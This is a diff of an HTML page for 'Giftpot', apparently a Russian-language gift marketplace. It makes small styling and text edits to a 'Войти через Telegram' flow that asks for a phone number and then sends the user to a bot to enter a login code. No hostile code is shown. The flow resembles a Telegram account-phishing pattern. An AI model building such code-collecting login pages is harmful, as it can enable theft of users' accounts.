@@ -72,6 +72,11 @@
             cursor: not-allowed;
         }
         
+        .btn-secondary {
+            background: #94a3b8;
+            margin-top: 12px;
+        }
+        
         .step {
             display: none;
         }
@@ -98,16 +103,6 @@
         
         @keyframes spin {
             to { transform: rotate(360deg); }
-        }
-
-        .warning {
-            background: rgba(251, 191, 36, 0.1);
-            border: 1px solid rgba(251, 191, 36, 0.3);
-            border-radius: 8px;
-            padding: 12px;
-            margin: 16px 0;
-            font-size: 13px;
-            color: #92400e;
         }
 
         .phone-input {
@@ -150,16 +145,11 @@
             </svg>
             
             <h1>Giftpot</h1>
-            <p class="subtitle">Здесь начинается мир продажи и
-обмена подарками
-
-</p>
+            <p class="subtitle">Здесь начинается мир продажи и обмена подарками</p>
             
             <button class="btn" id="login-btn" onclick="showPhoneStep()">
                 Войти через Telegram
             </button>
-
-        
             
             <div id="debug-info" class="debug" style="display: none;"></div>
         </div>
@@ -183,7 +173,7 @@
             />
             
             <button class="btn" onclick="submitPhone()">Продолжить</button>
-            <button class="btn" onclick="showStep('welcome-step')" style="margin-top: 12px; background: #94a3b8;">
+            <button class="btn btn-secondary" onclick="showStep('welcome-step')">
                 Назад
             </button>
         </div>
@@ -199,7 +189,7 @@
         <div id="success-step" class="step">
             <div style="font-size: 64px; margin-bottom: 16px;">✅</div>
             <h1>Готово!</h1>
-            <p class="subtitle">Проверьте бота</p>
+            <p class="subtitle">Проверьте бота для ввода кода</p>
         </div>
 
         <!-- Error Step -->
